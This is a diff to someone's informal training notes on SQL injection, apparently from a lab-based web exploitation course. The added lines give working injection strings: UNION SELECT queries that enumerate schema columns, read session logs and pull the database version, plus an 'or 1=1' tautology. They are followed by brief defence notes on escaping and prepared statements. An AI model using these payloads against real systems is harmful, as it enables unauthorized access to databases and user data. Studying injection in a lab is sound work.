@@ -155,6 +155,7 @@ Action: Conduct approved Web Exploitation techniques to collect intellegence.
 we found this site 10.100.28.55
 
 ****************************************************************************************************************************************************************************************************************************
+
                           Day 3 Web explotiation SQL
         
 POST method
@@ -195,15 +196,20 @@ SQL Injection
               craft query: Selection=2 UNION SELECT start,status,last_access from session.session_log            #put this into after the ?
 
 
+Nesting staements     |                                                                                        |
+      php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
 
+Server-side query becomes:               |            |
+      SELECT product FROM item WHERE id = 1 or 1=1; # limit 1;
 
+Blind injection for validation
 
+Extract version number
+      prices.php?item=4 UNION SELECT 1,2,@@version
 
-
-
-
-
-
+Defending Againct 
+      PHP: mysql_real_escape_string
+      SQL: sqlite3_prepare()
 
 
 
